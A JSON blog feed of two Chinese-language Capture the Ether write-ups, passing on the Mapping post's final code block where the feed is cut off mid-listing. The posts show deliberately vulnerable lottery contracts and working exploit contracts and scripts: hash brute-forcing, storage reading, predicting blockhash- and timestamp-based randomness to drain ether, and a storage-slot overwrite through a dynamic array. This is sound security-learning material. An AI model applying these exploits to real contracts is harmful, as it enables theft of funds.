{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"blockchain\" tag",
    "description": "中年矮臭挫油腻二刺猿死肥宅男什么都不会什么都做不来的废物",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/",
            "url": "https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/",
            "title": "Capture-the-ether-Lotteries-wp",
            "date_published": "2022-09-02T03:23:12.000Z",
            "content_html": "<h2 id=\"guess-the-secret-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-secret-number\">#</a> Guess the secret number</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheSecretNumberChallenge &#123;</span><br><span class=\"line\">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class=\"line\"></span><br><span class=\"line\">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function isComplete() public view returns (bool) &#123;</span><br><span class=\"line\">        return address(this).balance == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function guess(uint8 n) public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (keccak256(n) == answerHash) &#123;</span><br><span class=\"line\">            msg.sender.transfer(2 ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题外话 这里是低版本的构造函数 需要创建的时候就打一个 ether</p>\n<p>8 位的 keccak<br>\n 爆破即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\"></span><br><span class=\"line\">contract solution&#123;</span><br><span class=\"line\">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class=\"line\">    uint public x;</span><br><span class=\"line\">    function answer() public returns(uint8)&#123;</span><br><span class=\"line\">        for(uint8 i = 0 ; i &lt; 2**8 ; i++)&#123;</span><br><span class=\"line\">            if(keccak256(i) == answerHash)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                x = i;</span><br><span class=\"line\">                return i;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return 2**8-1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-the-random-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-random-number\">#</a> Guess the random number</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheRandomNumberChallenge &#123;</span><br><span class=\"line\">    uint8 answer;</span><br><span class=\"line\"></span><br><span class=\"line\">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\">        answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function isComplete() public view returns (bool) &#123;</span><br><span class=\"line\">        return address(this).balance == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function guess(uint8 n) public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (n == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(2 ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个合约有点老了<br>\n In short  <code>now</code>  is just an alias for  <code>block.timestamp</code> <br>\n 如果在 remix 上部署需要改一下 <code>block.number - 1</code>  不然会 pending<br>\n <code>block.blockhash()</code>  is now  <code>blockhash()</code>  and  <code>now</code>  is  <code>block.timestamp</code> . We’ll see this further on.</p>\n<p>timestamp 和 block 信息都在区块链探索器上可见</p>\n<p><img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/1.png\" alt></p>\n<p><img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/2.png\" alt><br>\ntimestamp <a href=\"https://www.epochconverter.com/\">Epoch Converter - Unix Timestamp Converter</a><br>\n 我想用 <code>interface</code>  与合约交互 结果失败了（不知道原因<br>\n<a href=\"https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347\"> Capture Ether: Guess the Random Number on a Smart Contract | by Tomás | Better Programming</a></p>\n<p>所以还是手撸<br>\n直接读取 Storage 不香吗 (也可以写个 solidity 的 exp 用 interface 来交互)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const ethers = require(&#x27;ethers&#x27;)</span><br><span class=\"line\">const fs = require(&#x27;fs-extra&#x27;)</span><br><span class=\"line\">require(&#x27;dotenv&#x27;).config()</span><br><span class=\"line\"></span><br><span class=\"line\">var Web3 = require(&#x27;web3&#x27;)</span><br><span class=\"line\">var web3 =  new Web3(&quot;your_rpc_url&quot;)</span><br><span class=\"line\">contractAddr = &quot;your_contract_addr&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">const cl = x =&gt; console.log(x)</span><br><span class=\"line\">function padding(x) &#123;</span><br><span class=\"line\">\tx = x.toString()</span><br><span class=\"line\">\tvar s = &quot;0x&quot;</span><br><span class=\"line\">\tfor(var i = 0; i &lt; (64 - x.length); i++) &#123;</span><br><span class=\"line\">\t\ts += &quot;0&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\treturn s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">async function getSlot(idx)&#123;</span><br><span class=\"line\">\tlet ret = await web3.eth.getStorageAt(contractAddr, idx)</span><br><span class=\"line\">\treturn ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">async function getShaIdx(idx)&#123;</span><br><span class=\"line\">\tlet ret = await web3.utils.sha3(padding(idx))</span><br><span class=\"line\">\treturn ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">async function main()&#123;</span><br><span class=\"line\">\tcl(await getSlot(0))</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">\t.then(() =&gt; process.exit(0))</span><br><span class=\"line\">\t.catch((err) =&gt; &#123;</span><br><span class=\"line\">\t\tconsole.log(err),</span><br><span class=\"line\">\t\tprocess.exit(1)</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-the-new-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-new-number\">#</a> Guess the new number</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheNewNumberChallenge &#123;</span><br><span class=\"line\">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function isComplete() public view returns (bool) &#123;</span><br><span class=\"line\">        return address(this).balance == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function guess(uint8 n) public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class=\"line\"></span><br><span class=\"line\">        if (n == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(2 ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没法在内存看了 只能嗯计算<br>\n关于 now 关键字<a href=\"https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties\"> documentation</a><br>\n 就是 timestamp</p>\n<p>根据 upon 大佬提醒 blockhash 只在 256 个块之内生效 所以两个块的布置不能间隔太久<br>\n否则 blockhash 就会返回 0<br>\n 而且 blockhash 是计算块 hash 如果本地的链没那么长是没法计算的</p>\n<p>如果我们可以在生成第二个区块钱同时执行 exp 合约和目标合约 那么结果也是一样的<br>\n因为 answer 是调用时才生成<br>\n直接写个 sol 交互</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Challenge &#123;</span><br><span class=\"line\">\tfunction guess(uint8 n) external payable;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract exp&#123;</span><br><span class=\"line\">\tChallenge public cha;</span><br><span class=\"line\">\tconstructor(address addr)&#123;</span><br><span class=\"line\">\t\tcha = Challenge(addr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction solve() public payable&#123;</span><br><span class=\"line\">\t\tuint8 ans = uint8(uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">\t\t\tblockhash(block.number - 1), block.timestamp</span><br><span class=\"line\">\t\t))));</span><br><span class=\"line\">\t\tcha.guess&#123;value: 1 ether&#125;(ans);</span><br><span class=\"line\">\t\tpayable(msg.sender).transfer(address(this).balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treceive() external payable&#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意 一定要将此合约的钱转出<br>\n <code>payable(msg.sender).transfer(address(this).balance);</code> <br>\n 另外一定要有 <code>receive</code>  函数 （没 function ） 来确保有钱转入</p>\n<h2 id=\"predict-the-future\"><a class=\"markdownIt-Anchor\" href=\"#predict-the-future\">#</a> Predict the future</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PredictTheFutureChallenge &#123;</span><br><span class=\"line\">    address guesser;</span><br><span class=\"line\">    uint8 guess;</span><br><span class=\"line\">    uint256 settlementBlockNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function isComplete() public view returns (bool) &#123;</span><br><span class=\"line\">        return address(this).balance == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class=\"line\">        require(guesser == 0);</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = msg.sender;</span><br><span class=\"line\">        guess = n;</span><br><span class=\"line\">        settlementBlockNumber = block.number + 1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function settle() public &#123;</span><br><span class=\"line\">        require(msg.sender == guesser);</span><br><span class=\"line\">        require(block.number &gt; settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = 0;</span><br><span class=\"line\">        if (guess == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(2 ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也就是我们先要用 <code>lockInGuess</code>  设置 guess 值<br>\n然后等待 block 增加了 用之前写入的去预测到增加后的块数</p>\n<p>但是之后的块数和时间都是可以预测的 并且只有十种可能性<br>\n也就是我们可以等到 answer 满足我们的 guess 的时候再调用 <code>settle</code></p>\n<p>注意 如果出现 <code># Transaction mined but execution failed</code> <br>\n 一定要改 matemask 的 gas limit<br>\n 不然查 txn 会查出 gas 超了<br>\n<img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/3.png\" alt><br>\n这个是借助中介合约一个个试 如果成功了就才调用 solve</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\">import &quot;./challenge.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">contract exp&#123;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\">\tPredictTheFutureChallenge public cha;</span><br><span class=\"line\">\tuint8 public n;</span><br><span class=\"line\">\tbool public success;</span><br><span class=\"line\">\tuint8 public answer;</span><br><span class=\"line\">\tfunction exp(address addr) public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t\tcha = PredictTheFutureChallenge(addr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction lockNumber(uint8 _n) public payable&#123;</span><br><span class=\"line\">\t\trequire(msg.value == 1 ether);</span><br><span class=\"line\">\t\trequire(_n &lt;= 9 &amp;&amp; _n &gt;= 0);</span><br><span class=\"line\">\t\tn = _n;</span><br><span class=\"line\">\t\tcha.lockInGuess.value(msg.value)(_n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction transfer() external payable &#123;</span><br><span class=\"line\">\t\taddress(this).transfer(msg.value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction solve() public payable&#123;</span><br><span class=\"line\">\t\tanswer = uint8(uint256(keccak256(</span><br><span class=\"line\">\t\t\tabi.encodePacked(</span><br><span class=\"line\">\t\t\t\tblock.blockhash(block.number - 1), now</span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\t))) % 10 ;</span><br><span class=\"line\">\t\tif(answer == n)&#123;</span><br><span class=\"line\">\t\t\tsuccess = true;</span><br><span class=\"line\">\t\t\tcha.settle();</span><br><span class=\"line\">\t\t\t// require(cha.isComplete(), &quot;Wrong answer&quot;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction withdraw() external payable&#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner);</span><br><span class=\"line\">\t\towner.transfer(address(this).balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction() public payable &#123;&#125;</span><br><span class=\"line\">\t// receive external payable&#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"predict-the-block-hash\"><a class=\"markdownIt-Anchor\" href=\"#predict-the-block-hash\">#</a> Predict the block hash</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.21;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PredictTheBlockHashChallenge &#123;</span><br><span class=\"line\">    address guesser;</span><br><span class=\"line\">    bytes32 guess;</span><br><span class=\"line\">    uint256 settlementBlockNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function isComplete() public view returns (bool) &#123;</span><br><span class=\"line\">        return address(this).balance == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class=\"line\">        require(guesser == 0);</span><br><span class=\"line\">        require(msg.value == 1 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = msg.sender;</span><br><span class=\"line\">        guess = hash;</span><br><span class=\"line\">        settlementBlockNumber = block.number + 1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function settle() public &#123;</span><br><span class=\"line\">        require(msg.sender == guesser);</span><br><span class=\"line\">        require(block.number &gt; settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = 0;</span><br><span class=\"line\">        if (guess == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(2 ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个就是我们需要提前预测 block + 1 的 hash<br>\n 但是难点是我们调用库 hash 是没法 hash 出下一块 block 的 hash 的</p>\n<blockquote>\n<p>The block hashes are not available for all blocks for scalability reasons.<br>\nYou can only access the hashes of the most recent 256 blocks, all other values will be zero.</p>\n</blockquote>\n<p>但是由于这个清零特性和块数和 hash 是异步分时的<br>\n只需要等 256 个块挖完了（15s 一个）之前猜个 0 即可</p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "url": "https://squirre17.github.io/2022/08/27/BlockChain-from-scratch-mapping/",
            "title": "BlockChain-from-scratch-mapping",
            "date_published": "2022-08-27T08:51:10.000Z",
            "content_html": "<p><a href=\"https://capturetheether.com/challenges/math/mapping/\">Capture the Ether - Mapping</a><br>\n 从一道题入门 blockchain</p>\n<h2 id=\"evm存储简介\"><a class=\"markdownIt-Anchor\" href=\"#evm存储简介\">#</a> EVM 存储简介</h2>\n<p>solidity 编译后的数据<br>\n是放在 slot 的结构中<br>\n slot 有 2 ^ 256 个<br>\n每一个有 256 位</p>\n<p>对于 solidity 中的可以在编译期间确定的静态元素<br>\n solc 会将其依次放入内存插槽中（slot）<br>\n<img src=\"/2022/08/27/BlockChain-from-scratch-mapping/1.png\" alt><br>\n这里 bcd 都是 256 位<br>\n所以放在 slot [0…2]<br>\n 但如果是可变长数据结构如果是 array 或者 map<br>\n 值会被放在其他地方 为了性能 这里是直接对当前的 idx 取 keccak<br>\n 比如 <code>keccak(0) = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</code> <br>\n 如果 <code>slot[0]</code>  是 array 的话 那么数据就会被放在<br>\n <code>slot[0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563]</code>  里</p>\n<p>注意这里 keccak 是对补齐后的字符串进行 hash 的 而不是对数字<br>\n所以需要 padding 一下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>solidity 同样存在和 c 一样内存对齐的概念 不再赘述</p>\n<h2 id=\"cte-mapping\"><a class=\"markdownIt-Anchor\" href=\"#cte-mapping\">#</a> cte-mapping</h2>\n<p>首先看合约 map 的 kv 可控</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MappingChallenge &#123;</span><br><span class=\"line\">    <span class=\"type\">bool</span> public isComplete;</span><br><span class=\"line\">    uint256[] <span class=\"built_in\">map</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">set</span><span class=\"params\">(uint256 key, uint256 value)</span> public &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Expand dynamic array as needed</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">map</span>.length &lt;= key) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">map</span>.length = key + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">map</span>[key] = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">get</span><span class=\"params\">(uint256 key)</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(uint256)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">map</span>[key];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>连接到合约</p>\n<p>set 是可以控制下标 那么给 <code>isComplete</code>  覆盖掉就行了 十分清楚<br>\n map 是可变结构 每个成员是存放在 <code>keccak(padding(1))</code>  依次往上的地方<br>\n可以打印看到</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 